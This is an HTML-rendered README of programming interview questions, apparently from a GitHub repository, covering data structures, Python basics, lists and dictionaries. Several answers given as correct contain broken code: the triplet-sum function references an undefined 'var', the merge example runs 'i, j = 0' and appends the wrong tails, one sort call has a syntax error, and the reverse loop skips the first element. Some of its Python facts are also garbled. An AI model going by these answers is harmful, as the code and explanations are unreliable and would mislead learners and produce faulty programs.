&lt;h5&gt;&lt;a id="user-content-data-structures--types" class="anchor" aria-hidden="true" href="#data-structures--types"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Data Structures &amp;amp; Types&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Implement Stack in any language you would like&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Implement Hash table in any language you would like&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;p&gt;&lt;a name="user-content-coding-advanced"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-star-advanced-7" class="anchor" aria-hidden="true" href="#star-advanced-7"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="star" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png"&gt;⭐️&lt;/g-emoji&gt; Advanced&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Name 3 design patterns. Do you know how to implement (= provide an example) these design pattern in any language you'll choose?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Given an array/list of integers, find 3 integers which are adding up to 0 (in any language you would like)&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;def find_triplets_sum_to_zero(li):
    li = sorted(li)
    for i, val in enumerate(li):
        low, up = 0, len(li)-1
        while low &amp;lt; i &amp;lt; up:
            tmp = var + li[low] + li[up]
            if tmp &amp;gt; 0:
                up -= 1
            elif tmp &amp;lt; 0:
                low += 1
            else:
                yield li[low], val, li[up]
                low += 1
                up -= 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-python" class="anchor" aria-hidden="true" href="#python"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Python&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-python-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-13" class="anchor" aria-hidden="true" href="#baby-beginner-13"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What are some characteristics of the Python programming language?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;1. It is a high level general purpose programming language created in 1991 by Guido Van Rosum.
2. The language is interpreted, being the CPython (Written in C) the most used/maintained implementation.
3. It is strongly typed. The typing discipline is duck typing and gradual.
4. Python focuses on readability and makes use of whitespaces/identation instead of brackets { }
5. The python package manager is called PIP "pip installs packages", having more than 200.000 available packages.
6. Python comes with pip installed and a big standard library that offers the programmer many precooked solutions.
7. In python **Everything** is an object.

There are many other characteristics but these are the main ones that every python programmer should know.
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What built-in types Python has?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;List
Dictionary
Set
Numbers (int, float, ...)
String
Bool
Tuple
Frozenset
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is mutability? Which of the built-in types in Python are mutable? How can you show that a certain data type is mutable?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Mutability determines whether you can modify an object of specific type.&lt;/p&gt;
&lt;p&gt;The mutable data types are:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;List
Dictionary
Set
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The immutable data types are:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Numbers (int, float, ...)
String
Bool
Tuple
Frozenset
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You can usually use the function hash() to check an object mutability. If an object is hashable, it is immutable (although this does not always work as intended as user defined objects might be mutable and hashable).
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;In Python, functions are first-class objects. What does it mean?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;In general, first class objects in programming languages are objects which can be assigned to variable, used as a return value and can be used as arguments or parameters.&lt;br&gt;
In python you can treat functions this way. Let's say we have the following function&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def my_function():
    return 5
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;You can then assign a function to a variables like this &lt;code&gt;x = my_function&lt;/code&gt; or you can return functions as return values like this &lt;code&gt;return my_function&lt;/code&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is the result of running &lt;code&gt;[] is not []&lt;/code&gt;? explain the result&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;It evaluates to True.&lt;br&gt;
The reason is that the two created empty list are different objects. &lt;code&gt;x is y&lt;/code&gt; only evaluates to true when x and y are the same object.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain inheritance and how to use it in Python&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;By definition inheritance is the mechanism where an object acts as a base of another object, retaining all its
properties.

So if Class B inherits from Class A, every characteristics from class A will be also available in class B.
Class A would be the 'Base class' and B class would be the 'derived class'.

This comes handy when you have several classes that share the same functionalities.

The basic syntax is:

class Base: pass

class Derived(Base): pass

A more forged example:

class Animal:
    def __init__(self):
        print("and I'm alive!")

    def eat(self, food):
        print("ñom ñom ñom", food)

class Human(Animal):
    def __init__(self, name):
        print('My name is ', name)
        super().__init__()

    def write_poem(self):
        print('Foo bar bar foo foo bar!')

class Dog(Animal):
    def __init__(self, name):
        print('My name is', name)
        super().__init__()

    def bark(self):
        print('woof woof')


michael = Human('Michael')
michael.eat('Spam')
michael.write_poem()

bruno = Dog('Bruno')
bruno.eat('bone')
bruno.bark()

&amp;gt;&amp;gt;&amp;gt; My name is  Michael
&amp;gt;&amp;gt;&amp;gt; and I'm alive!
&amp;gt;&amp;gt;&amp;gt; ñom ñom ñom Spam
&amp;gt;&amp;gt;&amp;gt; Foo bar bar foo foo bar!
&amp;gt;&amp;gt;&amp;gt; My name is Bruno
&amp;gt;&amp;gt;&amp;gt; and I'm alive!
&amp;gt;&amp;gt;&amp;gt; ñom ñom ñom bone
&amp;gt;&amp;gt;&amp;gt; woof woof

Calling super() calls the Base method, thus, calling super().__init__() we called the Animal __init__.

There is a more advanced python feature called MetaClasses that aid the programmer to directly control class creation.
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain and demonstrate class attributes &amp;amp; instance attributes&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;In the following block of code &lt;code&gt;x&lt;/code&gt; is a class attribute while &lt;code&gt;self.y&lt;/code&gt; is a instance attribute&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class MyClass(object):
    x = 1

    def __init__(self, y):
        self.y = y
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is an error? What is an exception? What types of exceptions are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;#  Note that you generally don't need to know the compiling process but knowing where everything comes from
#  and giving complete answers shows that you truly know what you are talking about.

Generally, every compiling process have a two steps.
    - Analysis
    - Code Generation.
    
    Analysis can be broken into:
        1. Lexical analysis   (Tokenizes source code)
        2. Syntactic analysis (Check whether the tokens are legal or not, tldr, if syntax is correct)
           
               for i in 'foo'
                          ^
             SyntaxError: invalid syntax
        
        We missed ':'
        
        
        3. Semantic analysis  (Contextual analysis, legal syntax can still trigger errors, did you try to divide by 0,
          hash a mutable object or use an undeclared function?)
          
                 1/0
                ZeroDivisionError: division by zero
        
    These three analysis steps are the responsible for error handlings.
    
    The second step would be responsible for errors, mostly syntax errors, the most common error.
    The third step would be responsible for Exceptions.
    
    As we have seen, Exceptions are semantic errors, there are many builtin Exceptions:
        
        ImportError
        ValueError
        KeyError
        FileNotFoundError
        IndentationError
        IndexError
        ...
    
    You can also have user defined Exceptions that have to inherit from the `Exception` class, directly or indirectly.

    Basic example:
        
    class DividedBy2Error(Exception):
        def __init__(self, message):
            self.message = message
    
    
    def division(dividend,divisor):
        if divisor == 2:
            raise DividedBy2Error('I dont want you to divide by 2!')
        return dividend / divisor
    
    division(100, 2)
    
    &amp;gt;&amp;gt;&amp;gt; __main__.DividedBy2Error: I dont want you to divide by 2!
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain Exception Handling and how to use it in Python&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What _ is used for in Python?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ol&gt;&lt;b&gt;
&lt;li&gt;Translation lookup in i18n&lt;/li&gt;
&lt;li&gt;Hold the result of the last executed expression or statement in the interactive interpreter.&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;As a general purpose "throwaway" variable name. For example: x, y, _ = get_data() (x and y are used but since we don't care about third variable, we "threw it away").
&lt;/b&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain what is GIL&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Lambda? How is it used?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-properties" class="anchor" aria-hidden="true" href="#properties"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Properties&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Are there private variables in Python? How would you make an attribute of a class, private?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following:
&lt;ul&gt;
&lt;li&gt;getter&lt;/li&gt;
&lt;li&gt;setter&lt;/li&gt;
&lt;li&gt;deleter&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain what is @property&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How do you swap values between two variables?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;x, y = y, x
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following object's magic variables:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;dict&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Write a function to return the sum of one or more numbers. The user will decide how many numbers to use&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;First you ask the user for the amount of numbers that will be use. Use a while loop that runs until amount_of_numbers becomes 0 through subtracting amount_of_numbers by one each loop. In the while loop you want ask the user for a number which will be added a variable each time the loop runs.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def return_sum():
	amount_of_numbers = int(input("How many numbers? "))
	total_sum = 0
	while amount_of_numbers != 0:
		num = int(input("Input a number. "))
		total_sum += num
		amount_of_numbers -= 1
	return total_sum

&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Print the average of [2, 5, 6]. It should be rounded to 3 decimal places&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;li = [2, 5, 6]
print("{0:.3f}".format(sum(li)/len(li)))
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-python-lists" class="anchor" aria-hidden="true" href="#python-lists"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Python Lists&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How do you get the maximum and minimum values from a list? How to get the last item from a list?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;Maximum: max(some_list)
Minimum: min(some_list)
Last item: some_list[-1]
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to get the top/biggest 3 items from a list?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;sorted(some_list, reverse=True)[:3]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Or&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;some_list.sort(reverse=True)
some_list[:3]
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to sort list by the length of items?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;sorted_li = sorted(li, key=len)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Or without creating a new list:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;li.sort(key=len)
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Do you know what is the difference between list.sort() and sorted(list)?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;
&lt;p&gt;sorted(list) will return a new list (original list doesn't change)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;list.sort() will return None but the list is change in-place&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sorted() works on any iterable (Dictionaries, Strings, ...)&lt;/p&gt;
&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;list.sort() is faster than sorted(list) in case of Lists
&lt;/b&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;


&lt;details&gt;
&lt;summary&gt;Convert every string to an integer: &lt;code&gt;[['1', '2', '3'], ['4', '5', '6']]&lt;/code&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;nested_li = [['1', '2', '3'], ['4', '5', '6']]
[[int(x) for x in li] for li in nested_li]
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to merge two sorted lists into one sorted list?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;sorted(li1 + li2) 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Another way:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;i, j = 0
merged_li = []

while i &amp;lt; len(li1) and j &amp;lt; len(li2):
    if li1[i] &amp;lt; li2[j]:
        merged_li.append(li1[i])
        i += 1
    else:
        merged_li.append(li2[j])
        j += 1

merged_li = merged_li + merged_li[i:] + merged_li[j:] 
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to check if all the elements in a given lists are unique? so [1, 2, 3] is unique but [1, 1, 2, 3] is not unique because 1 exists twice&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;
&lt;p&gt;There are many ways of solving this problem:&lt;br&gt;
&lt;code&gt;# Note: :list and -&amp;gt; bool are just python typings, they are not needed for the correct execution of the algorithm. &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Taking advantage of sets and len:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def is_unique(l:list) -&amp;gt; bool:
    return len(set(l)) == len(l)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This one is can be seen used in other programming languages.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def is_unique2(l:list) -&amp;gt; bool:
    seen = []

    for i in l:
        if i in seen:
            return False
        seen.append(i)
    return True
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here we just count and make sure every element is just repeated once.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def is_unique3(l:list) -&amp;gt; bool:
    for i in l:
        if l.count(i) &amp;gt; 1:
            return False
    return True
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This one might look more convulated but hey, one liners.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def is_unique4(l:list) -&amp;gt; bool:
    return all(map(lambda x: l.count(x) &amp;lt; 2, l))
&lt;/code&gt;&lt;/pre&gt;
&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;You have the following function
&lt;pre&gt;&lt;code&gt;def my_func(li = []):
    li.append("hmm")  
    print(li)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If we call it 3 times, what would be the result each call?&lt;/p&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;['hmm']
['hmm', 'hmm']
['hmm', 'hmm', 'hmm']
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to iterate over a list in reverse order?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Method 1&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;for i in reversed(li):
    ...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Method 2&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;n = len(li) - 1
while n &amp;gt; 0:
    ...
    n -= 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Sort a list of lists by the second item of each nested list&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;li = [[1, 4], [2, 1], [3, 9], [4, 2], [4, 5]]

sorted(li, key=lambda l: l[1])
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;or&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;li.sort(key=lambda l: l[1)
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Combine [1, 2, 3] and ['x', 'y', 'z'] so the result is [(1, 'x'), (2, 'y'), (3, 'z')]&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;nums = [1, 2, 3]
letters = ['x', 'y', 'z']

list(zip(nums, letters))
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-dictionaries" class="anchor" aria-hidden="true" href="#dictionaries"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Dictionaries&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;How to sort a dictionary by values?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;{k: v for k, v in sorted(x.items(), key=lambda item: item[1])}
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to sort a dictionary by keys?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;dict(sorted(some_dictionary.items()))
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;How to merge two dictionaries?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;pre&gt;&lt;code&gt;some_dict1.update(some_dict2)
&lt;/code&gt;&lt;/pre&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-common-algorithms-implementation" class="anchor" aria-hidden="true" href="#common-algorithms-implementation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Common Algorithms Implementation&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;Can you implement "binary search" in Python?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;&lt;a href="coding/python/binary_search.py"&gt;Solution&lt;/a&gt;
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
